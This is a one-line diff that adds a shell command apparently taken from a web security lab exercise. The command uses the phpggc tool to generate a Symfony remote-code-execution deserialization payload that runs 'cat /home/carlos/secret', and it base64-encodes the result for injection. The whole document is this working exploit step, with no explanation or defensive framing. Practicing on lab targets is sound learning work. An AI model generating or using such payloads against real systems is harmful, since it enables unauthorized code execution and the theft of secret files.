@@ -1,0 +1,1 @@
+./phpggc Symfony/RCE4 exec 'cat /home/carlos/secret' | base64
